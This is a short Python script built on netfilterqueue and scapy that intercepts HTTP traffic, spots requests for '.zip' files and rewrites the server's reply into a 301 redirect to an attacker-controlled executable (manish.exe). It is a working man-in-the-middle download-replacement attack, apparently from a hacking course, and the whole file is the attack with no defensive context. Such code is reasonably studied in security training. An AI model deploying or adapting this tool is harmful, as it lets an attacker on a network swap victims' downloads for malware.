#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


ack_list = []
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #scapy_packet.show()
    if scapy_packet.haslayer(scapy.Raw):
        #print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 80:
            #print "HTTP REQUEST"
            if ".zip" in scapy_packet[scapy.Raw].load:
                print "[+] exe download request"
                ack_list.append(scapy_packet[scapy.TCP].ack)
                #print scapy_packet.show()
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print "[+] replacing file"
                #print scapy_packet.show()
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://127.0.0.1/manish.exe\n\n")
                
                packet.set_payload(str(modified_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
